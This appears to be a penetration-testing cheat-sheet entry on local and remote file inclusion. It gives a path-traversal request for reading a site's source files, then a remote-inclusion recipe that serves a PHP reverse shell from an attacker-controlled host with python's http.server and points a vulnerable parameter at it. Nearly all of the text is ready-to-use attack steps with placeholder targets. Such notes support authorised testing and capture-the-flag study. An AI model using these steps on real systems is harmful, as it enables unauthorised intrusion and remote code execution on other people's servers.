# File Inclusion (LFI/RFI)

LFI via a "theme/template/skin"-style parameter — traverse to read source instead of rendering it:

```bash
view-source:http://<TARGET>/<page>?<param>=../<target-file-no-ext>
```

RFI — if the include/fetch isn't restricted to local paths, point it at attacker-hosted code. Some includes evaluate fetched PHP even without `<?php ?>` tags if the sink does `eval`/`include` on raw fetched content:

```bash
python -m http.server <LPORT>     # serve your payload (e.g. pentestmonkey php-reverse-shell)
GET /<endpoint>?<param>=http://<LHOST>:<LPORT>/shell.php
```
